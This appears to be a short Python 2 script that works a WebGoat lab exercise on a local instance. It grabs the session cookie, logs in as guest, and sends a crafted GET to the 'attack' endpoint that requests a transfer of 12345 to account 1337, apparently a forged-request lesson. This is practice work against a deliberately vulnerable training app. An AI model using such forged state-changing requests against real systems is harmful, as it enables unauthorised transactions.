import requests

r = requests.get('http://127.0.0.1:8080/WebGoat/')
dict =  r.headers
cookie = dict['Set-Cookie']
sessionID = cookie[11:43]
print sessionID

r = requests.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check/jsessionid=" + sessionID, data = {"username":"guest", "password":"guest"})

r = requests.get("http://127.0.0.1:8080/WebGoat/attack?Screen=146&menu=400&from=ajax&newAccount=1337&amount=12345&confirm=Confirm")

try:
	print r
except Exception as e:
	print e
